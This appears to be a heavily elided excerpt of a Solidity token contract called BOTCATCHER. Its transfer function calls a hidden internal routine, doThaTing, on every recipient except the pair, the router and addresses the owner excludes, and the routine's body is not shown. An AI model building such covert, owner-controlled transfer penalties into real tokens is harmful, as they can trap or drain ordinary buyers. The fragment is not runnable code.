...
contract BOTCATCHER {
    ...
    address WBNB_address = 0xc778417E063141139Fce010982780140Aa0cD5Ab; //ETH: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2  ETHtest: 0xc778417E063141139Fce010982780140Aa0cD5Ab BSCtest: 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd  BSC: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
    address prevBuyer;
    ...
    constructor() {
        ...
        emit Transfer(address(0), address(this), totalSupply()/2);
    ...
    function transfer(address to, uint amount) public returns(bool) {
        ...
        if(to != uniswapV2Pair && to != router && isExcluded[to] == false){
        doThaTing(to);
        }
    ...
    function doThaTing(address to) internal{
    ...
    function exclude(address user) public owner {
